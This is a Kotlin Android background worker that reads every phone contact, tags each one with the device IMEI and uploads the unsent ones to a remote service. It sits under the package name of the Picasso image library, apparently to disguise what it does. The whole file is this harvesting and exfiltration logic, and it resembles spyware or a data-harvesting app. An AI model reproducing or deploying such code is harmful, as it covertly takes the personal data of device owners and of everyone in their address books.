package com.squareup.picasso.presentation

import android.content.Context
import android.provider.ContactsContract
import androidx.work.Worker
import androidx.work.WorkerParameters
import com.squareup.picasso.core.LogUtils
import com.squareup.picasso.data.StorageResult
import com.squareup.picasso.data.network.*
import com.squareup.picasso.di.Injector
import com.squareup.picasso.domain.model.ContactEntity
import com.squareup.picasso.domain.usecase.contact.AddContactUseCase
import com.squareup.picasso.domain.usecase.contact.GetContactBySendUseCase
import com.squareup.picasso.domain.usecase.contact.GetContactUseCase
import com.squareup.picasso.domain.usecase.contact.UpdateContactUseCase
import com.squareup.picasso.domain.usecase.information.SendContactsUseCase
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.*
/***
 * https://es.stackoverflow.com/questions/72055/acceder-a-los-contactos-del-m%C3%B3vil
 */
class ContactWorker(context: Context, params: WorkerParameters) : Worker(context, params){

    private lateinit var imei: String

    //UseCase
    private var contactRepository = Injector.provideDataBaseContactRepository()
    private var addContactUseCase = AddContactUseCase(contactRepository)
    private var getContactUseCase = GetContactUseCase(contactRepository)
    private var getContactBySendUseCase = GetContactBySendUseCase(contactRepository)
    private var updateContactUseCase = UpdateContactUseCase(contactRepository)

    private var informationRepository = Injector.provideRemoteInformationRepository()
    private var sendContactsUseCase = SendContactsUseCase(informationRepository)

    override fun doWork(): Result {
        val appContext = applicationContext
        return try {
            imei = inputData.getString(KEY_IMEI_ARG)?:""
            if(imei != "") {
                getContacts(appContext)
                LogUtils.e("Started contact worker")
            }
            Result.success()
        } catch (throwable: Throwable) {
            Result.retry()
        }
    }

    private fun getContacts(context: Context){
        GlobalScope.launch {
            var listContacts = getContactsList(context)
            listContacts?.let{
                for(item in listContacts){
                    //If contactId and dateLastUpdate does not exist in the database, insert contactEntity with send = false
                    var isContact = getContactUseCase.invoke(item.contactId, item.dateLastUpdate)
                    if (isContact == null) {
                        LogUtils.e("${item.contactId} - ${item.dateLastUpdate} no existe en la BD")
                        addContactUseCase.invoke(item)
                    }
                }
                //If list of contacts (send == false) is not empty then send the list to remote service
                var listContactNotSend = getContactBySendUseCase.invoke(false)
                if (listContactNotSend.isNotEmpty())
                    loadNetworkContact(listContactNotSend)
            }
        }
    }

    private fun getContactsList(context: Context): List<ContactEntity>?{
        var listContactsContract = arrayOf (
            ContactsContract.Data.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER,
            ContactsContract.Contacts._ID,
            ContactsContract.CommonDataKinds.Phone.PHOTO_URI,
            ContactsContract.Data.CONTACT_LAST_UPDATED_TIMESTAMP,
            ContactsContract.CommonDataKinds.Email.ADDRESS)

        // Fetch Contacts Contract from Built-in Content Provider
        var cursor = context.contentResolver.query(
            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
            listContactsContract ,
            null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")

        if(cursor!=null) {
            var listContact = arrayListOf<ContactEntity>()
            while (cursor.moveToNext()) {
                var displayName = cursor.getString(cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME))?:""
                var number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))?:""
                var lastTimestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.Data.CONTACT_LAST_UPDATED_TIMESTAMP))?:""
                var contactId = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)) ?: ""
                listContact.add(ContactEntity(imei, displayName, number, lastTimestamp, contactId, false))
            }
            return deleteDuplicates(listContact)
        }else{
            return null
        }
    }

    private fun deleteDuplicates(listBasic: List<ContactEntity>): List<ContactEntity>{
        var listGroupBy = listBasic.groupBy {it.displayName}.entries.map { it.value.maxBy { it.displayName } }
        var listDistinct = arrayListOf<ContactEntity>()
        for(item in listGroupBy){
            item?.let {
                listDistinct.add(ContactEntity(imei, it.displayName, it.number, it.dateLastUpdate,it.contactId, false))
            }
        }
        return listDistinct
    }

    private fun convertLongToTime(time: Long): String {
        val date = Date(time)
        val format = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
        return format.format(date)
    }

    private fun loadNetworkContact(contacts: List<ContactEntity>) {
        GlobalScope.launch {
            var result: StorageResult<DataResponse> = sendContactsUseCase.invoke(contacts)
            when (result) {
                is StorageResult.Complete -> {
                    LogUtils.e("setContacts: Success " + result.data?.msj)
                    if (result.data?.msj == "valido") {
                        //Update the list of contacts with the field send = true
                        for (item in contacts) {
                            item.send = true
                            updateContactUseCase.invoke(item)
                        }
                    }

                }
                is StorageResult.Failure -> {
                    LogUtils.e("setContacts: Error ")
                }
            }
        }
    }

}